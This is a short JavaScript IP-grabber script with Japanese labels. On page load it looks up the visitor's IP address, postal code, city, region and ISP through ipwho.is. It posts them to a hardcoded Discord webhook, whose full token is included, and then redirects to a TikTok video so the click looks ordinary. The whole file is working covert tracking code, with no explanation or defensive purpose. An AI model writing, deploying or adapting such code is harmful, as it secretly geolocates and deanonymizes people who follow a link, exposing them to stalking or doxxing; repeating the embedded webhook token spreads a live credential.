const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU"; 
const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";

async function track() {
    try {
        const response = await fetch('https://ipwho.is/');
        const data = await response.json();
        
        if (!data.success) return;

        const details = {
            os: navigator.platform,
            browser: navigator.userAgent,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            referrer: document.referrer || "直接アクセス",
            localTime: new Date().toLocaleString('ja-JP')
        };

        if (WEBHOOK_URL) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "🚀 高精度アクセスログ (Webhook固定版)",
                        color: 15418782,
                        fields: [
                            { name: "🌐 IPアドレス", value: data.ip, inline: true },
                            { name: "📮 郵便番号", value: data.postal || "不明", inline: true },
                            { name: "📍 場所", value: `${data.region} ${data.city}`, inline: false },
                            { name: "🏢 プロバイダ (ISP)", value: data.connection.isp, inline: false },
                            { name: "🕒 取得時刻", value: details.localTime, inline: true },
                            { name: "🔗 参照元", value: details.referrer }
                        ],
                        footer: { text: "ipwho.is データベースを使用" },
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        }
    } catch (e) { console.error(e); }

    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
}

track();
